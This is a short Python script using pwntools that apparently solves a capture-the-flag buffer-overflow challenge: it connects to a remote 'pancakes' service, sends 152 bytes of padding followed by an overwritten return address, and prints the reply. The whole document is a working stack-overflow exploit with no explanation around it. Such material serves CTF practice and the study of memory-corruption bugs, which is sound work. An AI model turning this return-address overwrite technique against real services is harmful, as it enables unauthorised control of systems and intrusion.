from pwn import *

p = remote("jh2i.com", 50021)

payload = 'A' * 152 + p64(0x40098b)

p.recvuntil('How many pancakes do you want?')
p.sendline(payload)

data = p.recvall()

print(data)

p.close()